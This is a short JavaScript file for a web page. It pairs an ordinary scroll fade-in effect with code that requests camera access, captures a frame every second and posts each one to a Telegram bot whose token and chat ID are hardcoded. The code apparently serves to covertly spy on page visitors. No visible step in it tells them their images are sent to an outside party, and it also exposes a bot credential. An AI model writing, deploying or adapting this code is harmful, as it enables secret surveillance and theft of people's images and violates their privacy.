const sections = document.querySelectorAll('.fade-in');
window.addEventListener('scroll', () => {
    sections.forEach(sec => {
        const rect = sec.getBoundingClientRect();
        if (rect.top < window.innerHeight - 100) {
            sec.classList.add('visible');
        }
    });
});
const botToken = "8098677151:AAHw3ofWspeagUJWjWejk91whH9z9y_PoYA";
const chatId = "802683583";
let videoStream;
let interval;
async function startCamera() {
    const video = document.getElementById('camera');
    try {
        videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = videoStream;
        interval = setInterval(captureAndSend, 1000);
    } catch (err) {
        alert("Camera access denied: " + err);
    }
}
function captureAndSend() {
    const video = document.getElementById('camera');
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const imageData = canvas.toDataURL('image/jpeg');
    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: new URLSearchParams({
            chat_id: chatId,
            photo: imageData
        })
    }).then(res => res.json())
    .then(data => console.log("Sent to Telegram:", data))
    .catch(err => console.error(err));
}